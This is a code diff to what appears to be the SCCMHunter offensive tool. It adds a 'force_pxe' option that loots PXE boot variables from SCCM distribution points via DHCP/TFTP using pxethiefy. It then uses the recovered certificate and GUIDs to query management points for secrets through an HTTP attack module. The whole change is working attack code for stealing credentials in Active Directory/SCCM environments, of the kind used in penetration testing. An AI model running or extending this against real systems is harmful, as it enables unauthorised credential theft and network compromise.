@@ -3,6 +3,7 @@
 from lib.ldap import init_ldap_session
 from lib.logger import logger, printlog
 from lib.attacks.find import SCCMHUNTER
+from lib.attacks.http import HTTP
 import lib.scripts.pxethiefy as pxethiefy
 from impacket.smbconnection import SMBConnection
 import ntpath
@@ -19,8 +20,7 @@ class SMB:
     
     def __init__(self, username=None, password=None, domain=None, target_dom=None,target=None, 
                     dc_ip=None,ldaps=False, kerberos=False, no_pass=False, hashes=None, 
-                    aes=None, debug=False, save=False,
-                    logs_dir=None):
+                    aes=None, debug=False, save=False, force_pxe=False, logs_dir=None):
         self.username = username
         self.password = password
         self.domain = domain
@@ -40,6 +40,7 @@ class SMB:
         self.hashes=hashes
         self.lmhash = ""
         self.nthash = ""
+        self.force_pxe = force_pxe
         if self.hashes:
             self.lmhash, self.nthash = self.hashes.split(':')
 
@@ -57,7 +58,7 @@ class SMB:
             else:
                 logger.info("[-] Existing log file not found, searching LDAP for site servers.")
                 sccmhunter = SCCMHUNTER(username=self.username, password=self.password, domain=self.domain, 
-                                        target_dom=self.target_dom, target=self.target, dc_ip=self.dc_ip,ldaps=self.ldaps,
+                                        target_dom=self.target_dom, dc_ip=self.dc_ip,ldaps=self.ldaps,
                                         kerberos=self.kerberos, no_pass=self.no_pass, hashes=self.hashes, 
                                         aes=self.aes, debug=self.debug, logs_dir=self.logs_dir)
                 sccmhunter.run()
@@ -105,6 +106,8 @@ class SMB:
                         siteserv=False
                         dp = True
                         site_code = (remark.split(" ")[-3])
+                        if self.force_pxe:
+                            self.loot_pxe_server(server)
                     if name == "SMS_SITE":
                         siteserv = True
                         dp = True
@@ -175,6 +178,20 @@ class SMB:
         if vars_files:
             filename = "smbhunter.log"
             printlog(vars_files, self.logs_dir, filename)
+
+    def loot_pxe_server(self, server):
+        logger.info("[+] Found distribution point. Querying for PXE boot variables via DHCP/TFTP using pxethiefy")
+        client_guid, media_guid, cert, managementpoints = pxethiefy.loot_ip_address(server)
+        if cert:
+            managementpoints = managementpoints.split("*")
+            for managementpoint in managementpoints:
+                self.get_secrets_for_pxe_vars(client_guid, media_guid, cert, managementpoint)
+
+    def get_secrets_for_pxe_vars(self, client_guid, media_guid, cert, managementpoint):
+        httphunter = HTTP(domain=self.domain, dc_ip=self.dc_ip, mp=managementpoint, debug=self.debug, auto=True,
+                                client_guid=client_guid, media_guid=media_guid, certificate=cert, 
+                                logs_dir=self.logs_dir)
+        httphunter.run()
         
     def mssql_check(self, server):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
